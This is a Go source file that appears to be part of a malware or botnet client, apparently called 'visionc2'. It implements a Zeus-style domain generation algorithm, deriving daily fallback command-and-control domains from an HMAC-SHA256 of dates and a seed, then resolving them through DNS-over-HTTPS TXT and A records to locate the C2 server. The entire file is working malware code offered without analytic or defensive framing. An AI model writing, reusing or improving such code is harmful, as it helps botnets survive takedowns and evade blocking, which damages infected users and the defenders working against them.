package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"fmt"
	"strings"
	"time"
)

var dgaBackupDomains []string

const base36Chars = "0123456789abcdefghijklmnopqrstuvwxyz"

func base36Encode(bytes []byte) string {
	var sb strings.Builder
	for _, b := range bytes {
		idx := int(b) % len(base36Chars)
		sb.WriteByte(base36Chars[idx])
	}
	return sb.String()
}

// zeusDGA generates a deterministic set of daily C2 fallback domains based on seed and date.
func zeusDGA(seed []byte, date time.Time) []string {
	tldList := []string{".com", ".net", ".org", ".io", ".xyz", ".top", ".club"}
	var domains []string

	// Generate domains for a 7-day window [-3, +3] days around target date
	for offset := -3; offset <= 3; offset++ {
		targetDate := date.AddDate(0, 0, offset)
		dateStr := targetDate.Format("2006-01-02")

		mac := hmac.New(sha256.New, seed)
		mac.Write([]byte(dateStr))
		h := mac.Sum(nil)

		subdomain := base36Encode(h[:8])
		tld := tldList[int(h[8])%len(tldList)]
		domain := subdomain + tld
		domains = append(domains, domain)
	}
	return domains
}

// zeusDGAInit initializes the daily DGA domain list.
func zeusDGAInit() {
	seed := []byte(syncToken)
	if len(seed) == 0 {
		seed = []byte("visionc2_dga_default_seed")
	}
	dgaBackupDomains = zeusDGA(seed, time.Now())
	deoxys("zeusDGAInit: Generated %d backup DGA domains: %v", len(dgaBackupDomains), dgaBackupDomains)
}

// zeusDGAResolve attempts to resolve fallback C2 server from generated DGA domain list.
func zeusDGAResolve(defaultPort string) string {
	if len(dgaBackupDomains) == 0 {
		zeusDGAInit()
	}

	for _, domain := range dgaBackupDomains {
		deoxys("zeusDGAResolve: Trying DGA fallback domain: %s", domain)

		// 1. Try DoH TXT record
		if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
			deoxys("zeusDGAResolve: DoH TXT lookup success for DGA domain %s: %s", domain, c2Addr)
			return c2Addr
		}

		// 2. Try A record
		if ip, err := rayquaza(domain); err == nil && ip != "" {
			result := fmt.Sprintf("%s:%s", ip, defaultPort)
			deoxys("zeusDGAResolve: A record fallback success for DGA domain %s: %s", domain, result)
			return result
		}
	}

	return ""
}
